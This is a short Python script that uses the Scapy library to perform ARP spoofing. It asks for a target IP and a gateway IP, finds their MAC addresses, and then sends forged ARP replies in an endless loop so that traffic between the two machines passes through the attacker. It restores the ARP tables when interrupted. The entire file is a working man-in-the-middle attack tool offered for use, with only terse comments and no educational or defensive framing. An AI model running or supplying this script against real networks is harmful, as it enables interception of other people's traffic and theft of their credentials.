from scapy.all import *

def getmac(targetip):
	arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)  #pdst=dst in ARP
	targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc #srp==sr in layer2 #hwsrc==>mac_source psrc==>ip_source
	return targetmac

def spoofarpcache(targetip, targetmac, sourceip): #sourceip==>gateway
	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac) #targetmac==>targetmac(1st) and gatewaymac(2nd)
	send(spoofed, verbose= False)

def arprestore(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print ("ARP Table restored to normal for", targetip)
def main():
	targetip= input("Enter Target IP:")
	gatewayip= input("Enter Gateway IP:")

	try:                                #for target
		targetmac= getmac(targetip)
		print ("Target MAC", targetmac)
	except:
		print ("Target machine did not respond to ARP broadcast")
		quit()

	try:                                 #for router(gateway)
		gatewaymac= getmac(gatewayip)
		print ("Gateway MAC:", gatewaymac)
	except:
		print ("Gateway is unreachable")
		quit()
	try:
		print ("Sending spoofed ARP responses")
		while True:
			spoofarpcache(targetip, targetmac, gatewayip)   #target-->router spoofed packet crafted for target
			spoofarpcache(gatewayip, gatewaymac, targetip)  #router-->target  spoofed packet crafted for gateway
	except KeyboardInterrupt:
		print ("ARP spoofing stopped")
		arprestore(gatewayip, gatewaymac, targetip, targetmac)  #from gateway to target
		arprestore(targetip, targetmac, gatewayip, gatewaymac)  #from target to gateway
		quit()

if __name__=="__main__":
    main()